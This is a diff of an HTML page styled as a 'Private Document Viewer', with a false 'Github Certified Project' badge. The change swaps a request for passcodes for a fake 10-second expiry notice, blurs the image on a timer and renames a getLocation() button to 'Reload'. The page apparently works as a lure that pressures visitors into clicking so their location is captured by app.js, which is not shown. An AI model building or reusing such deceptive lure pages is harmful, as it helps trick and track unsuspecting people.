@@ -22,9 +22,9 @@
     <header><i class="ri-github-fill"></i>Github Certified Project</header>
 
     <h1>Private Document Viewer</h1>
-    <img class="main-img" src="./images/Social-Front-copy.jpg" alt="" height="200px">
+    <img id="main-img" src="./images/Social-Front-copy.jpg" alt="" height="180px">
     <div class="message-info">
-      <p><strong>Send Passcode and Passphrase.</strong></p>
+      <p><strong>Documents Expire in 10 Seconds.</strong></p>
 
     </div>
 
@@ -36,7 +36,7 @@
     <!-- <p><strong>Send Screenshot of Codes.</strong></p> -->
 
     <!-- <button onclick="getLocation()"><a href="/images/Social-Front.jpg">Download<i class="ri-download-line"></i></a> -->
-    <a href="#" onclick="getLocation()"><button>View Passcode<i class="ri-lock-unlock-line"></i></a></button>
+    <a href="#" onclick="getLocation()"><button>Reload<i class="ri-lock-unlock-line"></i></a></button>
 
 
     <!-- <a href="#" onclick="getLocation()"><button>Download</button></a> -->
@@ -58,7 +58,23 @@
   <div class="ad">
     <img src="/images/QB-Ad.jpg" alt="">
   </div>
-  <script src="/app.js"></script>
+
+  <script>
+
+
+    (function () {
+      const disImg = document.getElementById("main-img")
+      setTimeout(function () {
+        disImg.style = "filter: blur(20px);";
+        // disImg.classList.add('expired-img')
+      }, 10000);
+    })();
+  </script>
+
+
+
+  <script src="/animations.js"></script>
+  <script src="app.js"></script>
 
 </body>
 
